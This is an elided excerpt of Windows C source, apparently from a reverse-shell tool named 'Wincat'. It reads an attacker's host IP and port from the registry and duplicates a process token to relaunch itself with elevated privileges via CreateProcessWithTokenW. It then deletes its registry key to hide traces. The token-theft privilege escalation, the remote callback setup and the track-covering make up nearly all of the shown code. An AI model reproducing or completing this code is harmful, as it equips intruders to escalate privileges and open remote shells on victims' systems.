...
BOOL GetTargetHost(Advapi32_API advapi32, WCHAR** argurments, WCHAR* arg0) {
	...
	*argurments = (WCHAR*)calloc(argurmentsSize, sizeof(WCHAR));
	...
	if (RHostIPaddress != NULL) {
		...
		if (RHostPort != NULL) {
			...
			if (ReadRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKey, "RHostIP", RHostIPaddress, RHostIPaddressSize)) {
				if (ReadRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKey, "RHostPORT", RHostPort, RHostPortSize)) {
...
int GetSystem(Kernel32_API kernel32,Advapi32_API advapi32) {
	...
	if (ProcessToRun == NULL)
		return FALSE;
	if (kernel32.GetModuleFileNameWF(0, ProcessToRun, MAX_PATH) == 0){
		free(ProcessToRun);
		return FALSE;
	}
	...
	if (GetTargetHost(advapi32, &argurments, ProcessToRun)) {
		...
		HANDLE pNewToken;
		if (!advapi32.DuplicateTokenExF(pToken, MAXIMUM_ALLOWED, 0, seImpersonateLevel, tokenType, &pNewToken)){
		...
		if (GetTargetHost(advapi32, &argurments, ProcessToRun)) {
			...
			DeleteRegistryKey(advapi32, HKEY_CURRENT_USER, (char*)"Software", "Wincat");
			if (!advapi32.CreateProcessWithTokenWF(pNewToken, LOGON_NETCREDENTIALS_ONLY, ProcessToRun, argurments, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo)){
